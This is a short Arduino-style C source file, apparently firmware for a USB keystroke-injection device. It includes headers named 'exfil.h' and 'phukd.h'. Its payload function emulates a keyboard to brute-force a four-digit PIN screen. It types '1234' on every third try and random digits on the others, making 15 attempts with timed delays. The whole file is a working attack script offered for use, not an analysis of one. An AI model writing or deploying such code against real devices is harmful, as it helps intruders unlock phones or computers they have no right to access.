#include "exfil.h"
#include "phukd.h"

void typeCode(const char* code) {
  for (int i = 0; i < 4; i++) {
    Keyboard.press(code[i]);
    delay(130);
    Keyboard.releaseAll();
    delay(50);
  }
  Keyboard.releaseAll();
}

void payload() {
  delay(3000);

  for (int attempt = 0; attempt < 15; attempt++) { 
    if (attempt % 3 == 0) {
      typeCode("1234");
    } else {
      char code[5];
      for (int i = 0; i < 4; i++) {
        code[i] = random('0', '9' + 1);
      }
      code[4] = '\0';
      typeCode(code);
    }

    delay(3000);
  }
}
